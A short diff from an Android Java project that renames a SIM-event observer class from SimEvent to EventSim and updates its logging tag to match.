@@ -11,9 +11,9 @@ import com.ht.RCSAndroidGUI.evidence.Markup;
 import com.ht.RCSAndroidGUI.interfaces.Observer;
 import com.ht.RCSAndroidGUI.listener.ListenerSim;
 
-public class SimEvent extends EventBase implements Observer<Sim> {
+public class EventSim extends EventBase implements Observer<Sim> {
 	/** The Constant TAG. */
-	private static final String TAG = "SimEvent";
+	private static final String TAG = "EventSim";
 
 	private int actionOnEnter;
 
